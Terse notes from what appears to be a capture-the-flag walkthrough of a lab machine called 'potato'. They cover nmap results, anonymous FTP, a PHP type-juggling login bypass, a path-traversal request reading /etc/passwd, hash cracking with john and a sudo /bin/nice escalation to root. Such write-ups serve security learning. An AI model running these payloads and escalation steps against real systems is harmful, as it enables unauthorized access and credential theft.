----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# potato
# 6/1/2023

----------------------------------------------------
# nmap result
----------------------------------------------------
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Potato company
2112/tcp open  ftp     ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--   1 ftp      ftp           901 Aug  2 19:33 index.php.bak
|_-rw-r--r--   1 ftp      ftp            54 Aug  2 18:17 welcome.msg



ftp -P 2112 192.168.82.101
email anonymous@192.168.1.4]
cat index.php.bak 
pass = potato
password[]=""  \\ php jungling

after logging as admin

burp on downloading lg.txt

POST /admin/dashboard.php?page=log HTTP/1.1
Host: 192.168.82.101
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: http://192.168.82.101
Connection: close
Referer: http://192.168.82.101/admin/dashboard.php?page=log
Cookie: pass=serdesfsefhijosefjtfgyuhjiosefdfthgyjh
Upgrade-Insecure-Requests: 1

file=../../../../../../etc/passwd

got hash
$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/

john -w=/usr/share/wordlists/rockyou.txt hash
login with ssh
webadmin:dragon

sudo -l
cd /notes/
echo "/bin/bash" >> root.sh
chmod +x root.sh 
sudo /bin/nice /notes/../home/webadmin/root.sh 